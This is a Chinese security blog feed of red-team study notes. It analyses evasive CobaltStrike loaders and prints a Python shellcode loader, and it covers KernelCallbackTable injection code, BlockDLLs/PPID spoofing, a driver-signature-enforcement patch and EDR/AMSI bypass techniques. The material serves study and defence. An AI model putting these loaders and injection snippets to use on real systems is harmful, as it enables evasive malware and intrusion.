class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// blockdlls policy</span></div><div class="line">DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;</div><div class="line"><span class="comment">// add process mitigation atribute</span></div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">2</span>].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS_2;</div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">2</span>].Size = sizeof(DWORD64);</div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">2</span>].ValuePtr = &amp;policy;</div></pre></td></tr></table></figure><ul><li><p>Ref:<a href="https://offensivedefence.co.uk/posts/ntcreateuserprocess/" target="_blank" rel="external">PPID Spoofing &amp; BlockDLLs with NtCreateUserProcess</a></p></li><li><p>Ref:<a href="[https://paper.seebug.org/929/](https://paper.seebug.org/929/">关于 CS 的 Blockdll 实现的个人 POC</a>)</p></li><li><p>Ref:<a href="https://captmeelo.com/redteam/maldev/2022/05/10/ntcreateuserprocess.html" target="_blank" rel="external">Making NtCreateUserProcess Work</a></p></li><li><p>Ref:<a href="https://github.com/capt-meelo/NtCreateUserProcess/blob/master/main.cpp" target="_blank" rel="external">https://github.com/capt-meelo/NtCreateUserProcess/blob/master/main.cpp</a></p></li></ul><h2 id="0x02-Windows环境下的自保护探究"><a href="#0x02-Windows环境下的自保护探究" class="headerlink" title="0x02 Windows环境下的自保护探究"></a>0x02 Windows环境下的自保护探究</h2><ul><li>这篇文章作者的思路是这样的，在kill 杀软进程的时候，会使用OpenProcess打开杀软进程，在OPenProcessAPI函数底层呢，会调用ObRegisterCallbacks注册回调函数，所以作者的目的就是通过注册回调函数，首先判断当前进程ID是否是杀软自身的PID，如果是的话，则去除Kill进程的权限。<figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O<span class="function"><span class="title">perationInformation</span>-&gt;</span>P<span class="function"><span class="title">arameters</span>-&gt;</span>CreateHandleInformation.DesiredAccess &amp;= ~PROCESS_TERMINATE;</div></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-每周蓝军技术推送（2022-5-14-5-20）&quot;&gt;&lt;a href=&quot;#0x00-每周蓝军技术推送（2022-5-14-5-20）&quot; class=&quot;headerlink&quot; title=&quot;0x00 每周蓝军技术推送（2022.5.14-5.20）&quot;&gt;&lt;/a&gt;0x00 每周蓝军技术推送（2022.5.14-5.20）&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;这一周的推送，主要学习了三部分内容：&lt;/li&gt;
&lt;li&gt;篡改注册表与ETW，隐匿执行计划任务&lt;/li&gt;
&lt;li&gt;使用NtCreateUserProcess进行PPID欺骗 和BlockDLL&lt;/li&gt;
&lt;li&gt;Windows环境下的自保护探究
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>CobaltStrike高免杀样本分析</title>
    <link href="https://findream.github.io/2022/05/25/CobaltStrike%E9%AB%98%E5%85%8D%E6%9D%80%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <id>https://findream.github.io/2022/05/25/CobaltStrike高免杀样本分析/</id>
    <published>2022-05-25T06:02:11.000Z</published>
    <updated>2022-06-14T13:11:35.494Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;近期，在狩猎中，捕获到一批高度免杀的CobaltStrike样本，经过分析，目前这些免杀样本具备以下几种特征，第一，不在拘泥于传统的C++作为编程语言，也会采用C#或者Golang，或者脚本语言也会在整个攻击链中使用不同的语言，使用C++可能对使用者的要求有所提高，但是免杀效果可能更好。第二，对于shellcode的加密方式，不在拘泥于传统的异或或者AES，Base等公开的加密编码算法，也会采用一些好玩的，个性化的编码算法进行shellcode加密。第三，在开辟内存空间的时候，也不在使用传统的VirtualAlloc等R3层的API函数，更多的使用基于底层的API函数，第四，在调用shellcode过程中，也不像往常一样使用常规的方式调用shellcode，而是利用一些API的机制(CreateThread)，或者回调机制(EnumSystemLocalesW)，以及APC。<br><a id="more"></a></p><h2 id="0x01-Example1"><a href="#0x01-Example1" class="headerlink" title="0x01 Example1"></a>0x01 Example1</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个loader由C#编写，通过<code>powerShell.AddScript(@string);</code>加载加密过的Powershell脚本，然后通过<code>powerShell.BeginInvoke</code>执行。<br>   <img src="http://hacky.wang/blog/20220525/qaXTWKJGj3oG.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20220525/igppaXzAbCFp.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第2层powershell脚本中，依旧是执行Base64加密/编码过的Powershell语句<br>   <img src="http://hacky.wang/blog/20220525/D2dzLkeJRY7N.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;经过解码得到解码之后的Powershell脚本。第三层Powershell脚本逻辑也很清楚，首先解码一段base64，然后进行xor解密，获得一段shellcode，然后将解密获得的shellcode复制到内存中并执行。<br>   <img src="http://hacky.wang/blog/20220525/M1sraJ1PX2zv.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;经过分析，转储而来的shellcode是典型的cobaltstrike生成stageless类型的shellcode。也就是所谓的分离式免杀的操作。<br>   <img src="http://hacky.wang/blog/20220525/HlfthlTWfRdY.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20220525/d87EH0lvK6Ee.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其本质还是一个download。其会加载winnet.dll模块，然后依次调用<code>wininet!InternetOpenA</code>,<code>wininet!InternetConnectA</code>,<code>KERNEL32!VirtualAllocStub</code>,<code>wininet!InternetReadFile</code>等网络读取函数读取服务端获取的payload。最终在栈顶保存的是读取的payload的地址，待到函数返回，执行流跳转到payload处。<br>   <img src="http://hacky.wang/blog/20220525/4X5BfKPs0xA7.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20220525/yKFGpzN5ieTG.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以看到下载的bin主要有两部分组成，一个是引导shellcode，第二部分是payload，主要用来引导执行payload。这也是cobaltstrike特征之一。<br>   <img src="http://hacky.wang/blog/20220525/Ay4yTDOvlt4L.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;显然，熟悉beacon的一眼就看到了cobaltstrike特征，这是beacon的PE文件，在默认生成的beacon文件中，这是导出的ReflectiveLoad函数，处理完PE数据之后，最终调用DllEntry函数进行后续的处理。<br>   <img src="http://hacky.wang/blog/20220525/iDDm7IHUMk2j.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20220525/3LNMGFde8eGf.png?imageslim" alt="mark"></p><h2 id="0x02-Example2"><a href="#0x02-Example2" class="headerlink" title="0x02 Example2"></a>0x02 Example2</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.virustotal.com/gui/file/d0db40a4683de999dc11be3c8e5599363f21398a0a25c238dab1a680a2029d1f" target="_blank" rel="external">这个loader</a>使用GoLang编写，该样本并没有去除符号表，首先，检查系统的CPU个数和逻辑分区个数，如果CPU个数和逻辑分区个数小于4的话，则退出。<br>   <img src="http://hacky.wang/blog/20220528/hnHKiFkl7LGW.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后调用HeapCreate开辟内存空间，Golang编译的程序在汇编层面的函数调用方式和C++编译的有些许差异，在x64下，通过[eax]进行压栈传入参数，然后将需要调用的函数传入rax寄存器中，rcx保存的是参数的个数。并调用ZwAllocateVirtualMemory修改内存属性。<br>   <img src="http://hacky.wang/blog/20220528/qTyCrfDxjyGe.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20220528/4d9ddEWAr28n.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;16个字节组成的Byte[],如果需要将shellcode转化为UUID形式的话，如果shellcode长度不足16的话，将自动补齐。在CobaltStrike免杀样本中，UUID是以字符串形式存在于内存中，其通过API函数<code>UuidFromStringA</code>将其转化为UUID格式。<br>   <img src="http://hacky.wang/blog/20220528/hYXCzF2FThsV.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后，通过<code>EnumSystemLocalesW</code>函数通过回调的方式执行shellcode，同样的可以进行回调的还有以下函数<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>, EnumTimeFormatsA</div><div class="line"><span class="number">2</span>, EnumWindows</div><div class="line"><span class="number">3</span>, EnumDesktopWindows</div><div class="line"><span class="number">4</span>, EnumDateFormatsA</div><div class="line"><span class="number">5</span>, EnumChildWindows</div><div class="line"><span class="number">6</span>, EnumThreadWindows</div><div class="line"><span class="number">7</span>, EnumSystemLocales</div><div class="line"><span class="number">8</span>, EnumSystemGeoID</div><div class="line"><span class="number">9</span>, EnumSystemLanguageGroupsA</div><div class="line"><span class="number">10</span>, EnumUILanguagesA</div><div class="line"><span class="number">11</span>, EnumSystemCodePagesA</div><div class="line"><span class="number">12</span>, EnumDesktopsW</div><div class="line"><span class="number">13</span>, EnumSystemCodePagesW</div></pre></td></tr></table></figure></p><p>   <img src="http://hacky.wang/blog/20220528/181EYINyufLB.png?imageslim" alt="mark"></p><h2 id="0x03-Example3"><a href="#0x03-Example3" class="headerlink" title="0x03 Example3"></a>0x03 Example3</h2><ul><li><p>看图标和关键字显然，这是由<code>pyinstaller</code>打包而成的exe文件。目前常见的py打包工具主要有<code>pyinstaller</code>，<code>py2exe</code>,以及<code>cx_Freeze</code><br> <img src="http://hacky.wang/blog/20220530/eb0JbgWba5hY.png?imageslim" alt="mark"></p></li><li><p>针对<code>pyinstaller</code>打包而来的exe，可以使用<code>pyinstxtractor.py</code>进行解包，完成后，会在同目录生成一个extracted结尾的文件夹，在文件夹中，有两个没有后缀的文件，其中必然有一个名为struct文件。<br> <img src="http://hacky.wang/blog/20220530/6zXGpMBrmt4Q.png?imageslim" alt="mark"></p></li><li><p>那个名字为1的文件是一个抹去了时间戳和Magic的pyc文件，而抹去的信息可以在struct文件中找到，只需要复制<code>struct</code>文件的前16个字节复制到<code>1</code>这个文件中，即可。<br> <img src="http://hacky.wang/blog/20220530/oHHX0edBXdPT.png?imageslim" alt="mark"></p></li><li><p>然后使用在线的pyc2py的网站<a href="https://tool.lu/pyc/" target="_blank" rel="external">https://tool.lu/pyc/</a>就可以得到py代码如下。使用伪随机数解密，因为随机数种子是固定的，因为产生的随机数也是固定的。解密秘钥也就是固定的。loader是shellcode装载器，value是解密的shellcode。<br> <img src="http://hacky.wang/blog/20220530/BalqeFPTQs2s.png?imageslim" alt="mark"></p></li><li><p>loader代码如下，很常见的加载方式</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">shellcode = binascii.a2b_hex(value)</div><div class="line">ctypes<span class="selector-class">.windll</span><span class="selector-class">.kernel32</span><span class="selector-class">.VirtualAlloc</span><span class="selector-class">.restype</span>=ctypes.c_uint64</div><div class="line">rwxpage = ctypes<span class="selector-class">.windll</span><span class="selector-class">.kernel32</span><span class="selector-class">.VirtualAlloc</span>(<span class="number">0</span>, len(shellcode), <span class="number">0</span>x1000, <span class="number">0</span>x40)</div><div class="line">ctypes<span class="selector-class">.windll</span><span class="selector-class">.kernel32</span><span class="selector-class">.RtlMoveMemory</span>(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode), len(shellcode))</div><div class="line">handle = ctypes<span class="selector-class">.windll</span><span class="selector-class">.kernel32</span><span class="selector-class">.CreateThread</span>(<span class="number">0</span>, <span class="number">0</span>, ctypes.c_uint64(rwxpage), <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</div><div class="line">ctypes<span class="selector-class">.windll</span><span class="selector-class">.kernel32</span><span class="selector-class">.WaitForSingleObject</span>(handle, -<span class="number">1</span>)</div></pre></td></tr></table></figure></li><li><p>而shellcode是很明显的coabaltstrike的shellcode。<br> <img src="http://hacky.wang/blog/20220530/xKfvVYsjc1eo.png?imageslim" alt="mark"></p></li><li><p>Ref:<a href="https://xz.aliyun.com/t/10450#toc-8" target="_blank" rel="external">https://xz.aliyun.com/t/10450#toc-8</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-背景&quot;&gt;&lt;a href=&quot;#0x00-背景&quot; class=&quot;headerlink&quot; title=&quot;0x00 背景&quot;&gt;&lt;/a&gt;0x00 背景&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;近期，在狩猎中，捕获到一批高度免杀的CobaltStrike样本，经过分析，目前这些免杀样本具备以下几种特征，第一，不在拘泥于传统的C++作为编程语言，也会采用C#或者Golang，或者脚本语言也会在整个攻击链中使用不同的语言，使用C++可能对使用者的要求有所提高，但是免杀效果可能更好。第二，对于shellcode的加密方式，不在拘泥于传统的异或或者AES，Base等公开的加密编码算法，也会采用一些好玩的，个性化的编码算法进行shellcode加密。第三，在开辟内存空间的时候，也不在使用传统的VirtualAlloc等R3层的API函数，更多的使用基于底层的API函数，第四，在调用shellcode过程中，也不像往常一样使用常规的方式调用shellcode，而是利用一些API的机制(CreateThread)，或者回调机制(EnumSystemLocalesW)，以及APC。&lt;br&gt;
    
    </summary>
    
      <category term="windows 攻防" scheme="https://findream.github.io/categories/windows-%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>绿盟科技-每周蓝军技术推送（2022.4.30-5.6）学习</title>
    <link href="https://findream.github.io/2022/05/10/%E7%BB%BF%E7%9B%9F%E7%A7%91%E6%8A%80-%E6%AF%8F%E5%91%A8%E8%93%9D%E5%86%9B%E6%8A%80%E6%9C%AF%E6%8E%A8%E9%80%81%EF%BC%882022.4.30-5.6)/"/>
    <id>https://findream.github.io/2022/05/10/绿盟科技-每周蓝军技术推送（2022.4.30-5.6)/</id>
    <published>2022-05-10T06:02:11.000Z</published>
    <updated>2022-05-23T11:44:46.297Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-这一周的推送主要介绍的都是一些工具"><a href="#0x00-这一周的推送主要介绍的都是一些工具" class="headerlink" title="0x00 这一周的推送主要介绍的都是一些工具"></a>0x00 这一周的推送主要介绍的都是一些工具</h2><p><a href="https://mp.weixin.qq.com/s/X3FnWqdL-HfzFqfwNntQ6Q" target="_blank" rel="external">每周蓝军技术推送（2022.4.30-5.6)</a></p><a id="more"></a><h2 id="0x01-nim语言轻量化C2"><a href="#0x01-nim语言轻量化C2" class="headerlink" title="0x01 nim语言轻量化C2"></a>0x01 nim语言轻量化C2</h2><ul><li>nimc2 是使用nim编写的C2框架，目前来说作者更新的很快</li><li>生成的implant免杀效果还是很好的</li><li>Ref:<a href="https://github.com/d4rckh/nimc2/blob/main/README.md" target="_blank" rel="external">https://github.com/d4rckh/nimc2/blob/main/README.md</a></li></ul><h2 id="0x02-可注入PE转换工具v1-0版本发布"><a href="#0x02-可注入PE转换工具v1-0版本发布" class="headerlink" title="0x02 可注入PE转换工具v1.0版本发布"></a>0x02 可注入PE转换工具v1.0版本发布</h2><ul><li><p>pe_to_shellcode这款工具原理就是重新复写PE文件DOS头，因为装载器装载PE文件会读取MZ头，这块不能变，剩下的可以进行修改，从第五行开始，定位当前EIP，第六行，ebx为EIP，<code>sub ebx,9</code>则表示ebx为ImageBase，然后加一个常量，最终跳转到入口点。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="string">"\x4D"</span> //<span class="keyword">dec</span> <span class="built_in">ebp</span></div><div class="line"><span class="string">"\x5A"</span> //<span class="keyword">pop</span> <span class="built_in">edx</span></div><div class="line"><span class="string">"\x45"</span> //<span class="keyword">inc</span> <span class="built_in">ebp</span></div><div class="line"><span class="string">"\x52"</span> //<span class="keyword">push</span> <span class="built_in">edx</span></div><div class="line"><span class="string">"\xE8\x00\x00\x00\x00"</span> //<span class="keyword">call</span> &lt;next_line&gt;</div><div class="line"><span class="string">"\x5B"</span> // <span class="keyword">pop</span> <span class="built_in">ebx</span></div><div class="line"><span class="string">"\x48\x83\xEB\x09"</span> // <span class="keyword">sub</span> <span class="built_in">ebx</span>,<span class="number">9</span></div><div class="line"><span class="string">"\x53"</span> // <span class="keyword">push</span> <span class="built_in">ebx</span> (Image Base)</div><div class="line"><span class="string">"\x48\x81\xC3"</span> // <span class="keyword">add</span> <span class="built_in">ebx</span>,</div><div class="line"><span class="string">"\x59\x04\x00\x00"</span> // value</div><div class="line"><span class="string">"\xFF\xD3"</span> // <span class="keyword">call</span> <span class="built_in">ebx</span></div><div class="line"><span class="string">"\xc3"</span><span class="comment">; // ret</span></div></pre></td></tr></table></figure></li><li><p>Ref:<a href="https://github.com/hasherezade/pe_to_shellcode" target="_blank" rel="external">https://github.com/hasherezade/pe_to_shellcode</a></p></li></ul><h2 id="0x03-禁用驱动程序签名强制执行技术"><a href="#0x03-禁用驱动程序签名强制执行技术" class="headerlink" title="0x03 禁用驱动程序签名强制执行技术"></a>0x03 禁用驱动程序签名强制执行技术</h2><ul><li><p>作者首先介绍了，在windows10以前的操作系统，禁用驱动程序强制签名是很容易的，只需要将<code>g_CiOptions</code>设置为0即可。</p></li><li><p>但是在windows10的计算机中，微软启用了基于虚拟化的安全性VBS(Virtualization Based Security)和虚拟机托管程序代码完整性HVCI(Hypervisor Code Integrity)，就不可以很简单的修改内核数据了。</p></li><li><p>所以作者开始寻找在启动VBS的情况下，禁用DSE的方法。</p></li><li><p>根本原理就是通过Patch禁用DSE，首先作者针对<code>CiCheckPolicyBits</code>下断，并查看栈回溯，发现<code>CiValidateImageHeader</code>这是负责验证我们的驱动程序是否满足签名要求的函数,然后作者尝试加载一个未签名的驱动程序，并查看 <code>CiValidateImageHeader</code>的返回值，发现该函数返回值是一个NTSTATUS值(c0000428)，所以作者猜测只需要该函数返回为STATUS_SUCCESS（0）即可。所以只需要寻找一个方法Patch该函数即可。</p></li><li><p>首先作者将虚拟地址转化为PTE(页目录表项)</p></li><li><p>作者通过使用暴力搜索特征码的方式最终定位到了<code>CiValidateImageHeader</code>函数地址，然后Patch如下代码即可。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">xor</span> <span class="built_in">rax</span>, <span class="built_in">rax</span><span class="comment">; ret</span></div></pre></td></tr></table></figure></li><li><p>这篇文章涉及到好多内核的知识，看的不深入。</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-这一周的推送主要介绍的都是一些工具&quot;&gt;&lt;a href=&quot;#0x00-这一周的推送主要介绍的都是一些工具&quot; class=&quot;headerlink&quot; title=&quot;0x00 这一周的推送主要介绍的都是一些工具&quot;&gt;&lt;/a&gt;0x00 这一周的推送主要介绍的都是一些工具&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/X3FnWqdL-HfzFqfwNntQ6Q&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;每周蓝军技术推送（2022.4.30-5.6)&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>绿盟科技-每周蓝军技术推送（2022.4.16-4.22）学习</title>
    <link href="https://findream.github.io/2022/04/23/%E7%BB%BF%E7%9B%9F%E7%A7%91%E6%8A%80-%E6%AF%8F%E5%91%A8%E8%93%9D%E5%86%9B%E6%8A%80%E6%9C%AF%E6%8E%A8%E9%80%81%EF%BC%882022.4.16-4.22%EF%BC%89/"/>
    <id>https://findream.github.io/2022/04/23/绿盟科技-每周蓝军技术推送（2022.4.16-4.22）/</id>
    <published>2022-04-23T06:02:11.000Z</published>
    <updated>2022-05-23T11:44:41.971Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-企业级EDR绕过技术"><a href="#0x01-企业级EDR绕过技术" class="headerlink" title="0x01 企业级EDR绕过技术"></a>0x01 企业级EDR绕过技术</h2><ul><li>原文名称：A blueprint for evading industry leading endpoint protection in 2022</li><li>作者主要介绍了规避现代EDR的几种常见思路</li></ul><a id="more"></a><h2 id="0x02-构建API调用框架绕过杀软hook"><a href="#0x02-构建API调用框架绕过杀软hook" class="headerlink" title="0x02 构建API调用框架绕过杀软hook"></a>0x02 构建API调用框架绕过杀软hook</h2><ul><li><p>通常API函数调用过程如下：<br>3环API(kernel32.dll) -&gt; ntdll.dll -&gt; sysenter -&gt; KiFastCallentry -&gt; SSDT -&gt; 真正调用的0环API</p></li><li><p>文章作者的思路是既然应用层API调用都要经过SSDT，继而调用R0的函数，EDR产品会使用SSDT hook来监控敏感的调用。<br>所以，我们通过伪造的SSDT，来规避EDR产品检测。</p></li><li>作者首先通过中断门，进入R0，然后在伪造SSDT。这样的话，R3程序通过中断门，通过伪造的SSDT进入指定的内核函数。然后规避EDR。</li><li>但是，这个方法比较理想化，第一：win7及以上系统无法通过中断门进入，所以，理论上这个方法只能在windowsxp下实现，第二：因为涉及到驱动文件，如何保证文件落地不被查杀，第二，如何保证驱动能被安全的加载，第三，合理有效的数字签名如何获取。<br>Ref:<a href="https://tttang.com/archive/1546/" target="_blank" rel="external">https://tttang.com/archive/1546/</a></li></ul><h2 id="0x03-Kernelcallbacktable-注入"><a href="#0x03-Kernelcallbacktable-注入" class="headerlink" title="0x03 Kernelcallbacktable 注入"></a>0x03 Kernelcallbacktable 注入</h2><ul><li><p>KernelCallbackTable(系统回调表)是由KeUserModeCallback函数调用，每当GUI进程加载User32.dll的时候，系统就会通过PEB找到KernelCallbackTable地址，并进行初始化为函数数组，这个函数数组中的函数通常用于响应窗口消息。</p></li><li><p>所以，攻击者可以通过修改远程进程的KernelCallbackTable的函数数组，然后发送一个对应的窗口消息，从而实现劫持执行流。</p></li><li><p>本文作者参考modexpblog的思路：</p><ul><li><p>通过窗口获取目标进程Pid，从而获取目标进程的伪句柄。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">HANDLE hProcess = OpenProcess(<span class="name">PROCESS_ALL_ACCESS</span>, FALSE, pid)<span class="comment">;</span></div><div class="line">printf(<span class="string">"[+] Process Handle: 0x%p\n"</span>, hProcess)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>通过调用<code>NtQueryInformationProcess</code>获取ProcessBasicInformation，pbi结构体中保存着Peb的地址</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">PROCESS_BASIC_INFORMATION pbi<span class="comment">;</span></div><div class="line">pNtQueryInformationProcess myNtQueryInformationProcess = (<span class="name">pNtQueryInformationProcess</span>)GetProcAddress(<span class="name">GetModuleHandle</span>(<span class="name">L</span><span class="string">"ntdll.dll"</span>), <span class="string">"NtQueryInformationProcess"</span>)<span class="comment">;</span></div><div class="line">myNtQueryInformationProcess(<span class="name">hProcess</span>, ProcessBasicInformation, <span class="symbol">&amp;pbi</span>, sizeof(<span class="name">pbi</span>), NULL)<span class="comment">;</span></div></pre></td></tr></table></figure></li></ul></li></ul><pre><code>* 通过PEB获取KernelCallbackTable</code></pre><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">PEB peb;</div><div class="line">ReadProcessMemory(hProcess, pbi.PebBaseAddress, &amp;peb, <span class="keyword">sizeof</span>(peb), <span class="literal">NULL</span>);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] PEB Address: 0x%p\n"</span>, pbi.PebBaseAddress);</div><div class="line">KERNELCALLBACKTABLE kct;</div><div class="line">ReadProcessMemory(hProcess, peb.KernelCallbackTable, &amp;kct, <span class="keyword">sizeof</span>(kct), <span class="literal">NULL</span>);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] KernelCallbackTable Address: 0x%p\n"</span>, peb.KernelCallbackTable);</div><div class="line">``` </div><div class="line">    * 将shellcode和新的KernelCallbackTable写入远程进程</div></pre></td></tr></table></figure><p>LPVOID newKCTAddr = VirtualAllocEx(hProcess, NULL, sizeof(kct), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);<br>kct.__fnCOPYDATA = (ULONG_PTR)payloadAddr;<br>WriteProcessMemory(hProcess, newKCTAddr, &amp;kct, sizeof(kct), NULL);<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="bullet">* </span>更新一下PEB的KernelCallbackTable地址。</div></pre></td></tr></table></figure></p><p>// Update the PEB<br>WriteProcessMemory(hProcess, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &amp;newKCTAddr, sizeof(ULONG_PTR), NULL);<br>printf(“[+] Remote process PEB updated\n”);<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="bullet">* </span>最后，通过发送窗口请求，响应操作</div></pre></td></tr></table></figure></p><p>COPYDATASTRUCT cds;<br>WCHAR msg[] = L”Pwn”;<br>cds.dwData = 1;<br>cds.cbData = lstrlen(msg) * 2;<br>cds.lpData = msg;<br>SendMessage(hWindow, WM_COPYDATA, (WPARAM)hWindow, (LPARAM)&amp;cds);<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="bullet">* </span>Ref:[<span class="string">Adventures with KernelCallbackTable Injection</span>](<span class="link">https://captmeelo.com/redteam/maldev/2022/04/21/kernelcallbacktable-injection.html</span>)</div><div class="line"></div><div class="line"><span class="bullet">* </span>Ref:[<span class="string">Windows Process Injection: KernelCallbackTable used by FinFisher / FinSpy</span>](<span class="link">https://modexp.wordpress.com/2019/05/25/windows-injection-finspy/</span>)</div><div class="line"></div><div class="line"><span class="bullet">* </span>Ref:[<span class="string">攻击技术研判 ｜Lazarus搭载新的载荷执行与控制流劫持技术(此处原文应该来自M01n)</span>](<span class="link">http://www.ctfiot.com/28074.html</span>)</div><div class="line"></div><div class="line"><span class="section">## 0x04 利用Exception Directory获取系统服务调用号</span></div><div class="line"><span class="bullet">* </span>这篇文章思维跳跃度太高，没太看明白。</div><div class="line"></div><div class="line"><span class="section">## 0x05 常见的PE打包器在Windows 11中的免杀测试</span></div><div class="line"><span class="bullet">* </span>这几款免杀框架主要都采用了一下技术：</div><div class="line"><span class="bullet">* </span>Loader[ScareCrow]：通过将恶意的dll注入到诸如Wscript,Msiexe等系统进程中，规避一些EDR的检测，但效果估计差强人意。</div><div class="line"><span class="bullet">* </span>Console[ScareCrow]:通常，恶意软件需要隐藏窗口是通过创建进程时，设置ldflags标志实现的，但是这很容易被EDR检测到，所以，通过GetConsoleWindow和ShowWindow实现窗口隐藏。</div><div class="line"><span class="bullet">* </span>ByPass AMSI和ETW[ScareCrow,inceptor等]:这没什么好说的，正常的都会这样做的。</div><div class="line"><span class="bullet">* 